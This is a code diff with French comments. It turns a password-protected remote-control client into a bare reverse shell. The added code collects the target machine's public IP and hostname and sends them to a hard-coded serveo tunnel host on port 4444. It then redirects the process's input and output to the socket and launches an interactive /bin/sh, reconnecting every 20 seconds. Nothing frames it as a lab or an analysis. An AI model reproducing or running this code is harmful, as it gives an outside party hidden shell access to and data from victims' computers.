@@ -1,103 +1,49 @@
 import socket
 import subprocess
-import webbrowser
 import os
 import time
-import platform
+import urllib.request  # Pour récupérer l'IP publique via HTTP
 
 # --- CONFIGURATION ---
-# Remplace l'URL ci-dessous par l'adresse de ton serveur si nécessaire
-HOST = '103fa379dfd22edd-93-23-16-243.serveousercontent.com'
-PORT = 65432
-PASSWORD = "1234"
-RECONNECT_DELAY = 5
+URL_SERVEO = "103fa379dfd22edd-93-23-16-243.serveousercontent.com"
+PORT_SERVEO = 4444
 
-def execute_action(command):
-    sys_type = platform.system()
+def obtenir_ip_publique():
     try:
-        if command.startswith("popup:"):
-            msg = command[6:]
-            if sys_type == "Windows":
-                subprocess.run(['powershell', '-Command',
-                    f'Add-Type -AssemblyName PresentationFramework; '
-                    f'[System.Windows.MessageBox]::Show("{msg}")'])
-            else:
-                subprocess.run(['notify-send', '📱 Alerte Ractt', msg])
-            return "Notification affichée"
+        # Utilisation d'un service API simple pour obtenir l'IP
+        return urllib.request.urlopen('https://api.ipify.org').read().decode('utf8')
+    except:
+        return "IP Inconnue"
 
-        elif command.startswith("speak:"):
-            msg = command[6:]
-            if sys_type == "Windows":
-                subprocess.run(['powershell', '-Command',
-                    f'(New-Object -ComObject SAPI.SpVoice).Speak("{msg}")'])
-            else:
-                # Sur Bazzit/Linux, nécessite espeak-ng installé
-                subprocess.run(['espeak-ng', '-v', 'fr', msg])
-            return "Message vocal envoyé"
-
-        elif command == "lock":
-            if sys_type == "Windows":
-                os.system("rundll32.exe user32.dll,LockWorkStation")
-            else:
-                os.system("xdg-screensaver lock")
-            return "Écran verrouillé"
-
-        elif command.startswith("browser:"):
-            url = command[8:]
-            if not url.startswith("http"):
-                url = "https://" + url
-            webbrowser.open(url)
-            return f"Navigateur ouvert sur {url}"
-
-        elif command == "battery":
-            if sys_type == "Linux":
-                bat_path = "/sys/class/power_supply/BAT0/capacity"
-                if os.path.exists(bat_path):
-                    with open(bat_path) as f:
-                        return f"Batterie : {f.read().strip()}%"
-                return "Batterie : fichier introuvable"
-            return "Info batterie non supportée sur Windows"
-
-        return f"Commande inconnue : {command}"
-
-    except Exception as e:
-        return f"Erreur : {str(e)}"
-
-def main():
-    print(f"[*] Client Ractt ({platform.system()}) — connexion vers {HOST}:{PORT}")
+def connecter():
     while True:
         try:
-            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-                s.settimeout(10)
-                s.connect((HOST, PORT))
+            # 1. Récupérer les infos de la machine cible
+            ip_cible = obtenir_ip_publique()
+            nom_machine = socket.gethostname()
+            infos = f"--- Nouvelle Connexion ---\nIP Publique: {ip_cible}\nHostname: {nom_machine}\n--------------------------\n"
 
-                # Phase d'authentification
-                if s.recv(1024).decode() == "AUTH_REQUIRED":
-                    s.sendall(PASSWORD.encode())
+            # 2. Création de la socket et connexion
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((URL_SERVEO, PORT_SERVEO))
 
-                if s.recv(1024).decode() != "AUTH_SUCCESS":
-                    print("[-] Authentification échouée.")
-                    time.sleep(RECONNECT_DELAY)
-                    continue
+            # 3. Envoyer les infos au serveur dès la connexion
+            s.send(infos.encode('utf-8'))
 
-                print(f"[+] Connecté à {HOST} !")
-                s.settimeout(None)
+            # 4. Redirection des flux pour le shell
+            os.dup2(s.fileno(), 0)
+            os.dup2(s.fileno(), 1)
+            os.dup2(s.fileno(), 2)
 
-                while True:
-                    data = s.recv(4096).decode()
-                    if not data or data == "exit":
-                        print("[*] Déconnexion demandée par le serveur.")
-                        break
-                    response = execute_action(data)
-                    print(f"[>] {data} → {response}")
-                    s.sendall(response.encode())
+            # 5. Lancement du shell
+            subprocess.call(["/bin/sh", "-i"])
 
-        except (ConnectionRefusedError, socket.timeout):
-            print(f"[!] Serveur injoignable. Retry dans {RECONNECT_DELAY}s...")
-        except Exception as e:
-            print(f"[!] Erreur inattendue : {e}")
-
-        time.sleep(RECONNECT_DELAY)
+        except Exception:
+            # Attendre 20 secondes avant de réessayer si la connexion échoue
+            time.sleep(20)
+            continue
+        finally:
+            s.close()
 
 if __name__ == "__main__":
-    main()
+    connecter()
